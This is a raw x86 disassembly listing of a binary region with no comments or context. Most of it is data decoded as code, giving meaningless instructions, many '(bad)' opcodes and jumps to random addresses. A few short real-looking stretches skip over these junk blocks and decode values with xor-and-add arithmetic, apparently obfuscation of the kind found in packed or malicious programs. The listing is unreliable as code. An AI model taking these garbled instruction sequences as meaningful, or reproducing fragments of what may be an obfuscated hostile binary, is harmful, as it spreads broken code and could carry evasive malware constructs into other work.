  407acd:	mov    fs:0x68e75a4c,al
  407ad3:	mov    edi,0x1e5d6759
  407ad8:	xor    al,0xae
  407ada:	adc    eax,0x760a0393
  407adf:	ret    
  407ae0:	(bad)  
  407ae1:	mov    ds:0xebfdf624,eax
  407ae6:	add    BYTE PTR [edx-0x6c],al
  407ae9:	add    eax,esp
  407aeb:	xlat   BYTE PTR ds:[ebx]
  407aec:	rcr    DWORD PTR [eax+0x4e],0x2c
  407af0:	rcl    ebx,cl
  407af2:	sub    ecx,ebx
  407af4:	or     al,0xa4
  407af6:	xchg   esi,eax
  407af7:	cs ds push esi
  407afa:	sti    
  407afb:	les    edi,FWORD PTR [esi-0x76be032d]
  407b01:	sar    DWORD PTR [ebx],1
  407b03:	in     eax,dx
  407b04:	xchg   ecx,eax
  407b05:	jb     0x407b4d
  407b07:	inc    eax
  407b08:	and    BYTE PTR [esi],bh
  407b0a:	inc    edx
  407b0b:	push   esp
  407b0c:	push   cs
  407b0d:	push   cs
  407b0e:	and    ebx,0x7680bfc
  407b14:	xor    BYTE PTR [ebx],0xc6
  407b17:	add    eax,edi
  407b19:	push   eax
  407b1a:	mov    eax,DWORD PTR [ebp-0x10]
  407b1d:	add    eax,0xaa
  407b22:	push   eax
  407b23:	mov    eax,DWORD PTR [ebp-0x10]
  407b26:	mov    eax,DWORD PTR [eax+0x198]
  407b2c:	push   DWORD PTR [eax]
  407b2e:	jmp    0x407e7b
  407b33:	sahf   
  407b34:	das    
  407b35:	or     ah,BYTE PTR [edi]
  407b37:	mov    DWORD PTR [ecx],esp
  407b39:	mov    cl,0xb5
  407b3b:	pop    es
  407b3c:	mov    BYTE PTR [ebx],bl
  407b3e:	(bad)  
  407b3f:	mov    bh,0x8d
  407b41:	fsqrt  
  407b43:	push   edi
  407b44:	leave  
  407b45:	jo     0x407bb7
  407b47:	and    BYTE PTR [ebp+0x70],bh
  407b4a:	jo     0x407b19
  407b4c:	jne    0x407aec
  407b4e:	jo     0x407afe
  407b50:	jns    0x407afd
  407b52:	(bad)  
  407b53:	push   ebx
  407b54:	leave  
  407b55:	cli    
  407b56:	mov    dh,0x4
  407b58:	xchg   esi,eax
  407b59:	outs   dx,BYTE PTR ds:[esi]
  407b5a:	mov    WORD PTR [eax+0x662a9d63],cs
  407b60:	sub    bl,BYTE PTR [esi+0x30ddf384]
  407b66:	inc    ebx
  407b67:	hlt    
  407b68:	dec    edx
  407b69:	jne    0x407b29
  407b6b:	inc    eax
  407b6c:	or     dl,BYTE PTR [eax-0x73442b75]
  407b72:	jg     0x407b42
  407b74:	outs   dx,BYTE PTR ds:[esi]
  407b75:	bnd jmp DWORD PTR [edx+0x22597e7f]
  407b7c:	fdivr  QWORD PTR ds:0x98def197
  407b82:	(bad)  
  407b83:	jmp    0x407b4f
  407b85:	push   ss
  407b86:	in     al,0x53
  407b88:	xchg   ecx,eax
  407b89:	jo     0x407be6
  407b8b:	out    dx,eax
  407b8c:	or     BYTE PTR [edx],0x70
  407b8f:	dec    eax
  407b90:	dec    ecx
  407b91:	pop    esp
  407b92:	xchg   DWORD PTR [ebp-0x60],ebx
  407b95:	retf   
  407b96:	ror    cl,0xf2
  407b99:	xor    dl,bh
  407b9b:	into   
  407b9c:	cld    
  407b9d:	pusha  
  407b9e:	sbb    al,ah
  407ba0:	(bad)  
  407ba1:	cs cmp dl,al
  407ba4:	(bad)  
  407ba5:	jge    0x407b84
  407ba7:	fnstenv [edx-0x55]
  407baa:	sbb    esp,eax
  407bac:	inc    edi
  407bad:	mov    esp,0x7dbc97df
  407bb2:	mov    ecx,0xf2bfeb5b
  407bb7:	iret   
  407bb8:	popa   
  407bb9:	stos   DWORD PTR es:[edi],eax
  407bba:	pop    ebx
  407bbb:	cmp    ch,BYTE PTR [edi-0x3c7f3892]
  407bc1:	or     al,0x90
  407bc3:	(bad)  
  407bc4:	shl    BYTE PTR [ebp-0x31],cl
  407bc7:	xor    DWORD PTR [eax],ecx
  407bc9:	arpl   WORD PTR [edx-0x3ea1dca7],ax
  407bcf:	mov    BYTE PTR [edi-0x4f],ch
  407bd2:	xchg   ebx,eax
  407bd3:	cld    
  407bd4:	adc    ch,bh
  407bd6:	xlat   BYTE PTR ds:[ebx]
  407bd7:	jmp    0xde9dd937
  407bdc:	mov    ch,0x0
  407bde:	dec    ebx
  407bdf:	add    al,al
  407be1:	cmc    
  407be2:	and    cl,dh
  407be4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407be5:	or     BYTE PTR [ebp+ecx*1+0x21],bh
  407be9:	cdq    
  407bea:	jnp    0x407bce
  407bec:	xor    al,0x26
  407bee:	ja     0x407b97
  407bf0:	stc    
  407bf1:	bound  esi,QWORD PTR [eax]
  407bf3:	fbld   TBYTE PTR [ecx-0x5d]
  407bf6:	adc    al,0xd9
  407bf8:	vpaddd ymm4,ymm2,YMMWORD PTR [esi-0xb]
  407bfd:	adc    ecx,0x1d
  407c00:	test   ebx,edi
  407c02:	mov    eax,edi
  407c04:	mov    WORD PTR [ecx],fs
  407c06:	mov    ebx,0x31ffb7c1
  407c0b:	fdiv   DWORD PTR [edx-0x74a9fcc]
  407c11:	dec    edi
  407c12:	jne    0x407c43
  407c14:	mov    al,0x7e
  407c16:	mov    ch,0x3b
  407c18:	pop    ecx
  407c19:	push   ecx
  407c1a:	arpl   bx,si
  407c1c:	xchg   edi,eax
  407c1d:	iret   
  407c1e:	jne    0x407c36
  407c20:	sahf   
  407c21:	test   eax,0x798b4112
  407c26:	pusha  
  407c27:	mov    ebp,0x8359e6d2
  407c2c:	(bad)  
  407c2d:	shl    DWORD PTR [edi+ebp*8],cl
  407c30:	je     0x407c6e
  407c32:	mov    BYTE PTR [ebx+0x1b],ah
  407c35:	mov    ecx,0xf6304150
  407c3a:	cli    
  407c3b:	push   edi
  407c3c:	jbe    0x407bed
  407c3e:	xor    ebp,DWORD PTR [ecx]
  407c40:	push   ecx
  407c41:	sub    dh,al
  407c43:	jmp    0x2471f3a3
  407c48:	mov    dl,0xbc
  407c4a:	repz jns 0x407c2e
  407c4d:	inc    eax
  407c4e:	jmp    0x1c0a:0x6998e944
  407c55:	mov    esi,0x8882273a
  407c5a:	mov    al,ds:0x2438a8f4
  407c5f:	push   ebp
  407c60:	data16 ins BYTE PTR es:[edi],dx
  407c62:	jb     0x407ce2
  407c64:	or     eax,0xf53ad57a
  407c69:	pop    ss
  407c6a:	adc    DWORD PTR [edx+esi*2],ebp
  407c6d:	push   eax
  407c6e:	shl    bl,cl
  407c70:	or     al,0xcd
  407c72:	retf   
  407c73:	inc    edi
  407c74:	scas   eax,DWORD PTR es:[edi]
  407c75:	pusha  
  407c76:	out    0x98,eax
  407c78:	pop    eax
  407c79:	and    esi,ebx
  407c7b:	xor    dh,BYTE PTR [edi+edi*8]
  407c7e:	mov    ds:0xba4267a1,al
  407c83:	pop    ss
  407c84:	scas   eax,DWORD PTR es:[edi]
  407c85:	(bad)  
  407c86:	(bad)  
  407c87:	xor    ah,BYTE PTR [ecx-0x5a0bef4c]
  407c8d:	or     bh,BYTE PTR [ebp+0x48]
  407c90:	(bad)  
  407c91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c92:	lods   eax,DWORD PTR ds:[esi]
  407c93:	xor    ah,dl
  407c95:	scas   eax,DWORD PTR es:[edi]
  407c96:	mov    al,0xdd
  407c98:	pop    ds
  407c99:	test   eax,0xccb6cb8c
  407c9e:	push   edi
  407c9f:	pop    ebp
  407ca0:	mov    ah,0x2e
  407ca2:	loopne 0x407c64
  407ca4:	pop    es
  407ca5:	test   eax,0xde9e320a
  407caa:	(bad)  
  407cab:	loopne 0x407cf7
  407cad:	xchg   esi,eax
  407cae:	dec    ecx
  407caf:	or     al,0xd
  407cb1:	cmc    
  407cb2:	push   0xf8859f8c
  407cb7:	daa    
  407cb8:	adc    eax,0x95a80b04
  407cbd:	xor    al,0xf7
  407cbf:	les    esp,FWORD PTR [edi+0x13]
  407cc2:	mov    esi,0x1306dfdb
  407cc7:	push   0x5da0c8b6
  407ccc:	dec    edi
  407ccd:	push   ecx
  407cce:	outs   dx,DWORD PTR ds:[esi]
  407ccf:	rol    DWORD PTR [esp+eiz*8-0x3a32126f],0xd9
  407cd7:	dec    ecx
  407cd8:	ja     0x407cc3
  407cda:	out    0x79,al
  407cdc:	cmp    ecx,DWORD PTR [ebx]
  407cde:	push   ss
  407cdf:	mov    fs,WORD PTR [edi-0x59cf65a0]
  407ce5:	pushf  
  407ce6:	sahf   
  407ce7:	and    BYTE PTR [ecx-0x2c5046c5],dl
  407ced:	mov    edx,0x432af9bf
  407cf2:	test   al,0x19
  407cf4:	das    
  407cf5:	and    eax,ebx
  407cf7:	cmp    DWORD PTR [esi-0x5d],esi
  407cfa:	loopne 0x407d16
  407cfc:	call   0xde7306aa
  407d01:	sub    DWORD PTR [edi+edx*1-0x383b8286],0xffffffb2
  407d09:	jo     0x407cbf
  407d0b:	repnz cmp eax,0x26a4429d
  407d11:	mov    ecx,0xec927427
  407d16:	inc    edx
  407d17:	gs jb  0x407c9b
  407d1a:	outs   dx,DWORD PTR ds:[esi]
  407d1b:	sub    eax,0x8dd8490
  407d20:	and    dl,BYTE PTR [ecx+0x4]
  407d23:	xchg   esi,eax
  407d24:	cmp    eax,0x95658496
  407d29:	je     0x407d8c
  407d2b:	repnz mov edx,0x7de34c4d
  407d31:	sbb    eax,0x338fd40c
  407d36:	inc    ebx
  407d37:	push   ecx
  407d38:	leave  
  407d39:	add    BYTE PTR [ebx],ah
  407d3b:	addr16 mov ds:0x6f5b,eax
  407d3f:	adc    al,0x51
  407d41:	xadd   al,ah
  407d44:	mov    edi,DWORD PTR [ecx+0x6b]
  407d47:	jge    0x407d58
  407d49:	shl    edx,cl
  407d4b:	jmp    0x1b20:0xfe6a8a3a
  407d52:	xchg   esp,eax
  407d53:	fidiv  DWORD PTR [ecx-0x58]
  407d56:	jecxz  0x407da9
  407d58:	leave  
  407d59:	lods   al,BYTE PTR ds:[esi]
  407d5a:	ds ss xor al,0xc7
  407d5e:	push   esi
  407d5f:	fmul   DWORD PTR [edx+eiz*8+0x44492ef4]
  407d66:	fistp  QWORD PTR [ecx+0x3a]
  407d69:	hlt    
  407d6a:	cdq    
  407d6b:	add    DWORD PTR [edi],0x48
  407d6e:	(bad)  
  407d6f:	test   esi,ebx
  407d71:	and    al,0x5e
  407d73:	aad    0xe4
  407d75:	ret    
  407d76:	loop   0x407d09
  407d78:	cmp    edx,DWORD PTR [eax]
  407d7a:	test   eax,0x560508ab
  407d7f:	clc    
  407d80:	xchg   esi,eax
  407d81:	adc    DWORD PTR [eax+edx*2],edx
  407d84:	mov    eax,esp
  407d86:	xor    BYTE PTR [eax+0xacf8bd6],dl
  407d8c:	es pop ebx
  407d8e:	ss sbb esi,ebp
  407d91:	pop    edi
  407d92:	push   0x8f1e2df9
  407d97:	popf   
  407d98:	fwait
  407d99:	adc    eax,0x319d3405
  407d9e:	pop    edi
  407d9f:	mov    cl,dl
  407da1:	xchg   edi,eax
  407da2:	fild   QWORD PTR [edx+0x60]
  407da5:	fcomp  QWORD PTR [edx]
  407da7:	xor    DWORD PTR [edi-0x4bef27f8],esi
  407dad:	push   ebp
  407dae:	and    al,0xb6
  407db0:	enter  0xd94d,0x5
  407db4:	cmp    BYTE PTR [edi],bl
  407db6:	push   0xc7691c6e
  407dbb:	adc    eax,0x35b624c0
  407dc0:	xchg   BYTE PTR [edi+ebx*1],cl
  407dc3:	into   
  407dc4:	and    al,0xc6
  407dc6:	xchg   esi,eax
  407dc7:	mov    WORD PTR [eax+0x3e],es
  407dca:	out    0xad,al
  407dcc:	(bad)  
  407dcd:	enter  0x6346,0x2f
  407dd1:	imul   ecx,edx,0xadc658b3
  407dd7:	mov    ebp,esp
  407dd9:	cmp    BYTE PTR [eax-0x39],al
  407ddc:	mov    dh,0x2a
  407dde:	mov    ecx,0xc589ea4b
  407de3:	ret    
  407de4:	js     0x407e0c
  407de6:	fld    QWORD PTR ds:0x445aeae6
  407dec:	add    ah,cl
  407dee:	pop    esi
  407def:	out    0xa0,eax
  407df1:	pop    es
  407df2:	call   0x2aec:0xa6e83f11
  407df9:	adc    ch,BYTE PTR [eax]
  407dfb:	cmc    
  407dfc:	outs   dx,DWORD PTR ds:[esi]
  407dfd:	sahf   
  407dfe:	inc    ecx
  407dff:	retf   
  407e00:	sub    bh,BYTE PTR [esi]
  407e02:	jnp    0x407de7
  407e04:	xchg   ebx,eax
  407e05:	sbb    eax,0x5956b278
  407e0a:	ins    BYTE PTR es:[edi],dx
  407e0b:	jle    0x407dd9
  407e0d:	adc    dh,dh
  407e0f:	jae    0x407e61
  407e11:	xchg   BYTE PTR [ebp+0x5a12406d],dl
  407e17:	js     0x407e83
  407e19:	mov    edx,0x437f77e3
  407e1e:	jnp    0x407e7a
  407e20:	cs dec edi
  407e22:	xchg   dh,dl
  407e24:	push   eax
  407e25:	mov    ds:0xd31989a9,eax
  407e2a:	inc    ecx
  407e2b:	lock xchg ebp,eax
  407e2d:	mov    ah,BYTE PTR [edi+0x54c8beb9]
  407e33:	inc    esp
  407e34:	cwde   
  407e35:	xchg   edi,eax
  407e36:	jl     0x407ead
  407e38:	xchg   esi,eax
  407e39:	lods   al,BYTE PTR ds:[esi]
  407e3a:	(bad)  
  407e3b:	rcr    DWORD PTR [esi-0x51],cl
  407e3e:	sbb    BYTE PTR [edx+0x14600caa],dl
  407e44:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  407e46:	add    edx,DWORD PTR [ebx-0x42]
  407e49:	leave  
  407e4a:	cmp    al,ah
  407e4c:	and    eax,0xe314cbbd
  407e51:	aaa    
  407e52:	lds    esp,FWORD PTR [edi+0x6e]
  407e55:	push   0x9
  407e57:	cmp    BYTE PTR [ebx],cl
  407e59:	cmp    eax,0xbf4d3106
  407e5e:	pop    ss
  407e5f:	push   edi
  407e60:	pop    ss
  407e61:	dec    ebp
  407e62:	(bad)  
  407e64:	jecxz  0x407e3a
  407e66:	in     eax,dx
  407e67:	daa    
  407e68:	xchg   ebx,eax
  407e69:	mov    esi,esi
  407e6b:	dec    ebp
  407e6c:	and    al,0x46
  407e6e:	mov    ecx,0x6ecfb6d
  407e73:	test   al,0x70
  407e75:	jl     0x407e52
  407e77:	and    bh,dh
  407e79:	shr    BYTE PTR [eax],cl
  407e7b:	call   0x4120bb
  407e80:	mov    DWORD PTR [ebp-0x8],eax
  407e83:	cmp    DWORD PTR [ebp-0x8],0x0
  407e87:	jmp    0x4081d4
  407e8c:	in     eax,0xe6
  407e8e:	outs   dx,DWORD PTR ds:[esi]
  407e8f:	pop    ebp
  407e90:	outs   dx,DWORD PTR ds:[esi]
  407e91:	jne    0x407e88
  407e93:	data16 hlt 
  407e95:	test   ebx,eax
  407e97:	pushf  
  407e98:	cli    
  407e99:	leave  
  407e9a:	aam    0xa0
  407e9c:	pop    es
  407e9d:	aad    0x70
  407e9f:	jo     0x407ec1
  407ea1:	jge    0x407f13
  407ea3:	jo     0x407ed7
  407ea5:	xor    edx,ecx
  407ea7:	mov    al,0xcb
  407ea9:	cmp    DWORD PTR [esi-0x197ca755],esp
  407eaf:	and    bh,BYTE PTR [esi+0xd38b3e3]
  407eb5:	ss xchg ebx,eax
  407eb7:	arpl   ax,cx
  407eb9:	inc    esp
  407eba:	fs test DWORD PTR ds:[eax],ebx
  407ebe:	pop    esi
  407ebf:	(bad)
  407ec5:	cwde   
  407ec6:	adc    al,0xed
  407ec8:	fild   DWORD PTR [edx+0x44]
  407ecb:	imul   ebx,DWORD PTR [edi],0xffffffc2
  407ece:	xchg   DWORD PTR [eax-0x49],edx
  407ed1:	jno    0x407e57
  407ed3:	rcl    BYTE PTR [edx+0x47650e2a],0x75
  407eda:	mov    ds:0xd10363bf,al
  407edf:	popa   
  407ee0:	ds inc ecx
  407ee2:	addr16 pusha 
  407ee4:	pop    ecx
  407ee5:	xor    eax,0x93468d0c
  407eea:	add    BYTE PTR [edi],ah
  407eec:	sbb    DWORD PTR [edi],edx
  407eee:	push   0xffffffb9
  407ef0:	mov    dl,0x40
  407ef2:	mov    ds:0x5bb36fe4,al
  407ef7:	sub    eax,0x2edce8e6
  407efc:	repz adc al,BYTE PTR [ecx-0x21e50f70]
  407f03:	mov    bl,0xa9
  407f05:	mov    DWORD PTR [ebp-0x49cebb99],0x24dd4571
  407f0f:	cmp    al,0x75
  407f11:	mov    bl,0xed
  407f13:	imul   edx,eax,0xffffffec
  407f16:	and    BYTE PTR [ecx-0x71],0x43
  407f1a:	ss es dec esi
  407f1d:	mov    BYTE PTR [esi+ebp*8-0x15],ah
  407f21:	push   ds
  407f22:	pop    ecx
  407f23:	imul   ecx,DWORD PTR [esi+0x3e2120d4],0xa2ec4e61
  407f2d:	xlat   BYTE PTR ds:[ebx]
  407f2e:	loopne 0x407f5b
  407f30:	pop    esi
  407f32:	aaa    
  407f33:	dec    eax
  407f34:	lahf   
  407f35:	outs   dx,DWORD PTR ds:[esi]
  407f36:	(bad)  
  407f37:	leave  
  407f38:	cmp    ebp,eax
  407f3a:	pop    es
  407f3b:	ret    0x518a
  407f3e:	fisttp DWORD PTR [esi+0x6ba9c584]
  407f44:	mov    eax,ds:0x953d3cd1
  407f49:	inc    ecx
  407f4a:	add    al,0x60
  407f4c:	mov    edx,0x9bab3397
  407f51:	or     esp,esp
  407f53:	lods   al,BYTE PTR ds:[esi]
  407f54:	sub    al,0xbc
  407f56:	mov    dh,0x48
  407f58:	jns    0x407fd0
  407f5a:	cdq    
  407f5b:	xor    BYTE PTR [edi+0x51255a16],dl
  407f61:	aaa    
  407f62:	popa   
  407f63:	cdq    
  407f64:	(bad)  
  407f65:	mov    dh,0xe
  407f67:	pop    esi
  407f68:	mov    cl,0x34
  407f6a:	push   0x23
  407f6c:	jae    0x407f2c
  407f6e:	call   0x68f8:0x89355fec
  407f75:	xor    ecx,DWORD PTR [ebx+0x48]
  407f78:	test   dh,ah
  407f7a:	xor    DWORD PTR [ecx+0x640d7911],ebx
  407f80:	jecxz  0x407f2a
  407f82:	mov    ebp,ss
  407f84:	jmp    0xe2f73dd7
  407f89:	(bad)  
  407f8a:	sub    DWORD PTR [ebp+0x40],ebx
  407f8d:	dec    edi
  407f8e:	push   ebp
  407f8f:	cli    
  407f90:	mov    dh,0x4d
  407f92:	or     dh,bl
  407f94:	test   esi,0xbb37e35b
  407f9a:	cmc    
  407f9b:	mov    bh,0x34
  407f9d:	mov    ds:0x43633b1a,eax
  407fa2:	arpl   WORD PTR [edx+0x4be22c91],dx
  407fa8:	imul   eax,DWORD PTR [ebx-0xa245d8e],0x14
  407faf:	push   ss
  407fb0:	and    bl,cl
  407fb2:	push   0x72
  407fb4:	gs not dh
  407fb7:	ret    0x10fd
  407fba:	push   ss
  407fbb:	jmp    0xc0f7aa18
  407fc0:	jnp    0x40802c
  407fc2:	jnp    0x408031
  407fc4:	sub    bh,ah
  407fc6:	bound  edi,QWORD PTR [edx-0x5c1f54e3]
  407fcc:	sub    ebx,ebp
  407fce:	loopne 0x407fd5
  407fd0:	loop   0x407fbe
  407fd2:	mov    ds:0xf9e00a25,eax
  407fd7:	xor    bh,BYTE PTR ds:0xf6b0d396
  407fdd:	or     ch,BYTE PTR [esi+0x58f6567c]
  407fe3:	pop    edi
  407fe4:	jg     0x40804e
  407fe6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fe7:	mov    WORD PTR [edx+0x22],gs
  407fea:	push   ebx
  407feb:	mov    ah,0xef
  407fed:	jp     0x407ff3
  407fef:	in     al,dx
  407ff0:	hlt    
  407ff1:	inc    edx
  407ff2:	jno    0x407fae
  407ff4:	(bad)  
  407ff5:	mov    ds:0x9f066ee7,eax
  407ffa:	cdq    
  407ffb:	shl    DWORD PTR [eax+0x2bf7ef7c],1
  408001:	mov    dl,0x18
  408003:	(bad)  
  408004:	mov    DWORD PTR [ebp+0x383a3c01],edi
  40800a:	lds    esi,FWORD PTR [ebp-0x3cdb6bea]
  408010:	nop
  408011:	imul   edi,edi,0x19387caa
  408017:	rol    BYTE PTR es:[eax+0x52dee9ab],1
  40801e:	xchg   edx,eax
  40801f:	cmp    esi,DWORD PTR [edi]
  408021:	jae    0x40805a
  408023:	fisttp DWORD PTR [eax]
  408025:	nop
  408026:	aam    0x73
  408028:	jge    0x408063
  40802a:	fmul   DWORD PTR [ebx-0x58]
  40802d:	adc    BYTE PTR [ebx],bl
  40802f:	dec    ebx
  408030:	cmp    esp,ebp
  408032:	xchg   edx,eax
  408033:	xchg   edi,eax
  408034:	xchg   BYTE PTR [edx+0x745811bb],bh
  40803a:	fsubr  DWORD PTR [esi]
  40803c:	cmp    eax,esi
  40803e:	jle    0x408037
  408040:	pop    ebp
  408041:	in     al,0x29
  408043:	xor    DWORD PTR [esi+0x3d],eax
  408046:	cwde   
  408047:	sti    
  408048:	add    al,0xa3
  40804a:	push   0x55
  40804c:	jge    0x407ff5
  40804e:	rol    DWORD PTR [edx-0x39],1
  408051:	(bad)  
  408052:	or     bh,ah
  408054:	xor    eax,0x140dd0e9
  408059:	adc    eax,0xcf501f28
  40805e:	push   ebx
  40805f:	jge    0x408090
  408061:	mov    edi,0x9e188855
  408066:	sub    ecx,DWORD PTR [edi+0x7f]
  408069:	lds    ebp,FWORD PTR [edi-0x7a91b49c]
  40806f:	fwait
  408070:	call   0xaa28cbcd
  408075:	jb     0x408079
  408077:	mov    edi,0x4abf1138
  40807c:	mov    eax,ds
  40807e:	pop    esp
  40807f:	sub    esp,DWORD PTR [ecx-0x1869759a]
  408085:	pop    edi
  408086:	rcl    DWORD PTR ds:0x4c272f68,cl
  40808c:	xchg   ecx,eax
  40808d:	arpl   dx,bp
  40808f:	scas   eax,DWORD PTR es:[edi]
  408090:	inc    edi
  408091:	push   0x2aa1a96c
  408096:	or     BYTE PTR [ecx],dl
  408098:	and    ch,dl
  40809a:	popf   
  40809b:	jbe    0x408088
  40809d:	mov    bh,0xf4
  40809f:	les    edi,FWORD PTR [si]
  4080a2:	out    dx,eax
  4080a3:	jmp    0xcb7c6f3c
  4080a8:	fadd   DWORD PTR [edi-0x343c8224]
  4080ae:	cmp    DWORD PTR [eax],eax
  4080b0:	out    dx,al
  4080b1:	int3   
  4080b2:	sar    DWORD PTR [edi-0x9],0x4e
  4080b6:	mov    ecx,0x1dac3989
  4080bb:	pop    esi
  4080bc:	aaa    
  4080bd:	jae    0x4080a4
  4080bf:	mov    WORD PTR [ecx+0x76ccbb5d],ds
  4080c5:	or     cl,dh
  4080c7:	mov    cl,BYTE PTR [edi-0x2408f124]
  4080cd:	sbb    edi,ebx
  4080cf:	sub    DWORD PTR [edx+0x45],ebp
  4080d2:	es (bad) 
  4080d5:	cmp    ch,BYTE PTR [eax+0x52]
  4080d8:	jne    0x4080e8
  4080da:	or     al,0x3c
  4080dc:	test   BYTE PTR [edi+0x13ed0f87],al
  4080e2:	lahf   
  4080e3:	xor    ch,dh
  4080e5:	jo     0x4080c8
  4080e7:	pushf  
  4080e8:	mov    esi,0x70ad3a44
  4080ed:	push   0x4e
  4080ef:	das    
  4080f0:	sub    eax,0xd21bc037
  4080f5:	inc    DWORD PTR [ecx]
  4080f7:	xchg   DWORD PTR [bx+si+0x3adb],edi
  4080fc:	push   edi
  4080fd:	mov    esp,esp
  4080ff:	call   0xefd8e170
  408104:	cmp    eax,0xbbe105d7
  408109:	stos   DWORD PTR es:[edi],eax
  40810a:	inc    bp
  40810c:	fs stc 
  40810e:	sti    
  40810f:	mov    edi,0xb15ffc75
  408114:	bound  ebp,QWORD PTR [edi+eax*2-0x762254b4]
  40811b:	push   ebx
  40811c:	test   eax,0xf29bc4c3
  408121:	cmp    ch,ah
  408123:	leave  
  408124:	push   ecx
  408125:	pand   mm7,mm1
  408128:	mov    dh,0x4c
  40812a:	pop    ebp
  40812b:	bnd jo 0x4080bc
  40812e:	push   ss
  40812f:	test   eax,0xa12efaa3
  408134:	adc    eax,0x1b6cd571
  408139:	inc    ebp
  40813a:	rol    BYTE PTR [ecx-0x75],0x1d
  40813e:	mov    bl,0x89
  408140:	lods   al,BYTE PTR ds:[esi]
  408141:	xor    eax,0xe7caaef2
  408146:	push   0x1e
  408148:	mov    al,ds:0x8f69629a
  40814d:	out    0x94,eax
  40814f:	outs   dx,DWORD PTR ds:[esi]
  408150:	inc    edx
  408151:	ins    DWORD PTR es:[edi],dx
  408152:	arpl   ax,di
  408154:	pushw  ss
  408156:	sub    eax,0x49787fc4
  40815b:	cs pop ebx
  40815d:	(bad)  
  40815e:	adc    eax,0xde2a4912
  408163:	xor    eax,0x72fbc10
  408168:	ret    
  408169:	mov    al,ds:0xd0912fa4
  40816e:	js     0x408168
  408170:	jp     0x40812c
  408172:	cmp    eax,0x32166344
  408177:	mov    al,ds:0xf005796b
  40817c:	fnstenv [esp+ecx*1]
  40817f:	inc    edi
  408180:	and    ebx,DWORD PTR [edi]
  408182:	push   ebp
  408183:	fsub   QWORD PTR [ebx+0x4a]
  408186:	jge    0x408188
  408188:	int3   
  408189:	mov    ecx,0x5c882508
  40818e:	adc    ebp,DWORD PTR [esi+0x5cef0990]
  408194:	mov    ds,WORD PTR [edi-0x651b6ee7]
  40819a:	loopne 0x40820f
  40819c:	sbb    eax,0x39405856
  4081a1:	call   0x47dd:0xb5835d2e
  4081a8:	aad    0x55
  4081aa:	sub    DWORD PTR [esi-0x7db3b630],edx
  4081b0:	jo     0x4081e5
  4081b2:	dec    ebx
  4081b3:	cmp    BYTE PTR [edx*2-0x41042be],ch
  4081ba:	inc    esi
  4081bb:	call   0xb8feda0e
  4081c0:	mov    dh,0xdd
  4081c2:	cmp    edi,DWORD PTR [eax+0x57]
  4081c5:	or     al,0x97
  4081c7:	retf   0x9404
  4081ca:	mov    esi,edi
  4081cc:	push   0xfffffffe
  4081ce:	cmp    DWORD PTR [edx-0x42],ebx
  4081d1:	mov    dh,0xe
  4081d3:	popf   
  4081d4:	lea    eax,[ebp+0x4]
  4081d7:	mov    DWORD PTR [ebp-0x20],eax
  4081da:	je     0x40966c
  4081e0:	lea    eax,[ebp-0x18]
  4081e3:	push   eax
  4081e4:	mov    eax,DWORD PTR [ebp-0x2c]
  4081e7:	xor    eax,esi
  4081e9:	add    eax,edi
  4081eb:	push   eax
  4081ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4081ef:	xor    eax,esi
  4081f1:	add    eax,edi
  4081f3:	push   eax
  4081f4:	push   DWORD PTR [ebp-0x8]
  4081f7:	lea    eax,[ebp-0x78]
  4081fa:	push   eax
  4081fb:	push   DWORD PTR [ebp-0xc]
  4081fe:	push   DWORD PTR [ebp-0x14]
  408201:	call   0x406508
  408206:	test   eax,eax
  408208:	je     0x408233
  40820e:	lea    eax,[ebp-0x78]
  408211:	push   eax
  408212:	mov    eax,DWORD PTR [ebp-0x14]
  408215:	xor    eax,esi
  408217:	add    eax,edi
  408219:	push   eax
  40821a:	mov    eax,DWORD PTR [ebp-0x10]
  40821d:	add    eax,0xee
  408222:	push   eax
  408223:	mov    eax,DWORD PTR [ebp-0x10]
  408226:	mov    eax,DWORD PTR [eax+0x198]
  40822c:	push   DWORD PTR [eax]
  40822e:	call   0x4120bb
  408233:	mov    ecx,DWORD PTR [ebp-0x1c]
  408236:	xor    ecx,esi
  408238:	mov    eax,0xffcd8d64
  40823d:	sub    eax,ecx
  40823f:	sub    eax,DWORD PTR [ebp-0x8]
  408242:	mov    ecx,DWORD PTR [ebp-0x30]
  408245:	add    ecx,eax
  408247:	mov    eax,DWORD PTR [ebp-0x8]
  40824a:	mov    DWORD PTR [eax+0x1],ecx
  40824d:	mov    al,BYTE PTR [ebp-0x1]
  408250:	mov    ecx,DWORD PTR [ebp-0x8]
  408253:	xor    al,0x47
  408255:	sub    al,0x37
  408257:	jmp    0x4085a4
  40825c:	ja     0x408201
  40825e:	mov    ecx,0x7175496f
  408263:	mov    ds:0xd6da6ce9,eax
  408268:	or     al,0xc9
  40826a:	(bad)  
  40826b:	mov    ah,0x37
  40826d:	shl    BYTE PTR [eax+0x70],cl
  408270:	and    BYTE PTR [ebp+0x70],bh
  408273:	jo     0x408202
  408275:	loopne 0x408283
  408277:	jbe    0x4082ba
  408279:	xor    eax,0x349c1e10
  40827e:	and    DWORD PTR [edx+0x34],edi
  408281:	test   al,0x1c
  408283:	inc    eax
  408284:	pop    esp
  408285:	xor    dh,BYTE PTR [eax+0x29]
  408288:	mov    ds:0x26856cff,al
  40828d:	mov    ds:0xe01207b6,eax
  408292:	jl     0x4082d2
  408294:	ror    DWORD PTR [ebp-0x69bdaa22],cl
  40829a:	out    dx,eax
  40829b:	mov    cl,0x10
  40829d:	ret    0x87d5
  4082a0:	es mov esi,0x17767179
  4082a6:	mov    ebx,0xf0580755
  4082ab:	cld    
  4082ac:	dec    esi
  4082ad:	ret    
  4082ae:	ja     0x4082f7
  4082b0:	jae    0x4082e2
  4082b2:	stos   DWORD PTR es:[edi],eax
  4082b3:	(bad)  
  4082b4:	(bad)  
  4082b5:	jbe    0x4082e7
  4082b7:	sub    DWORD PTR [ebx-0x1b],0xffffffb8
  4082bb:	jmp    0x4082a5
  4082bd:	push   0x7c1dd7ee
  4082c2:	mov    edx,0x4f6ece21
  4082c7:	out    dx,al
  4082c8:	ins    BYTE PTR es:[edi],dx
  4082c9:	adc    DWORD PTR [edi-0x5485418],ebx
  4082cf:	sub    ebp,esi
  4082d1:	into   
  4082d2:	jmp    0x2025:0xe67e3212
  4082d9:	lds    ebp,FWORD PTR [ebp+0x67]
  4082dc:	cmp    BYTE PTR [edi+ebx*2-0x302dd1ae],dh
  4082e3:	lock (bad) 
  4082e5:	jmp    DWORD PTR [edi-0x78]
